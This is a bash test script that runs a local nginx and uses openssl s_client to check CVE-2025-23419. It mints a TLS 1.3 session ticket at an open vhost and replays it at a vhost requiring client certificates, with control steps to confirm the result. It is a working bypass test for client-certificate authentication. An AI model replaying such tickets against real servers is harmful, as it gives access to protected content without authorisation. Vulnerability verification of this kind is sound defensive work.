#!/bin/bash
# Does a ticket minted at a vhost that requires NO client certificate resume at a vhost
# that REQUIRES one, and get that host's content? That is CVE-2025-23419.
#   1. control: reach protected.test with no client certificate, full handshake -> must FAIL
#   2. mint a ticket at open.test (no client certificate involved)
#   3. replay that ticket with SNI/Host = protected.test -> the question
set -u
cd "$(dirname "$0")"
PORT=8443
rm -f open.sess step*.out
nginx -p "$PWD/" -c nginx.conf & NGX=$!
sleep 2

say() { printf '\n=== %s ===\n' "$1"; }

say "1. CONTROL: protected.test, full handshake, NO client certificate"
printf 'GET / HTTP/1.1\r\nHost: protected.test\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:$PORT -servername protected.test -tls1_3 \
   -CAfile ca.pem -ign_eof > step1.out 2>&1
if grep -q "PROTECTED-HOST-CONTENT" step1.out; then
  echo "    SERVED protected content without a client certificate  <-- control FAILED, test invalid"
else
  echo "    refused, as it must be. $(grep -oE '400 No required SSL certificate|alert[a-z ]*|Verify return code: [0-9]+ \(.*\)' step1.out | head -1)"
fi

say "2. mint a ticket at open.test (no client certificate requested there)"
printf 'GET / HTTP/1.1\r\nHost: open.test\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:$PORT -servername open.test -tls1_3 \
   -CAfile ca.pem -sess_out open.sess -ign_eof > step2.out 2>&1
grep -q "OPEN-HOST-CONTENT" step2.out && echo "    open host served content" || echo "    open host did NOT serve"
[ -s open.sess ] && echo "    ticket saved ($(wc -c < open.sess | tr -d ' ') bytes)" || echo "    NO TICKET SAVED"

say "3. THE TEST: replay that ticket at protected.test, still no client certificate"
printf 'GET / HTTP/1.1\r\nHost: protected.test\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:$PORT -servername protected.test -tls1_3 \
   -CAfile ca.pem -sess_in open.sess -ign_eof > step3.out 2>&1
reused=$(grep -cE '^Reused, ' step3.out || true)
echo "    session reused by the TLS layer: $([ "$reused" -gt 0 ] && echo yes || echo no)"
if grep -q "PROTECTED-HOST-CONTENT" step3.out; then
  echo "    RESULT: VULNERABLE. Protected content served to a party that never authenticated."
else
  echo "    RESULT: not vulnerable. $(grep -oE '400 No required SSL certificate|alert[a-z ]*' step3.out | head -1)"
fi

say "4. CONTROL: replay the SAME ticket back at open.test"
# Without this, a negative result in step 3 is unreadable: it could mean nginx declined the
# ticket (the fix) or that the ticket was never offerable (a broken test). If it resumes here
# and not at protected.test, the only variable left is the vhost's client-auth configuration.
printf 'GET / HTTP/1.1\r\nHost: open.test\r\nConnection: close\r\n\r\n' \
 | openssl s_client -connect 127.0.0.1:$PORT -servername open.test -tls1_3 \
   -CAfile ca.pem -sess_in open.sess -ign_eof > step4.out 2>&1
if grep -qE '^Reused, ' step4.out; then
  echo "    ticket RESUMED at its own host, so it was valid and offerable"
  echo "    => step 3's full handshake is nginx declining it, which is the fix working"
else
  echo "    ticket did NOT resume even at its own host  <-- control FAILED, step 3 proves nothing"
fi

kill $NGX 2>/dev/null; wait $NGX 2>/dev/null
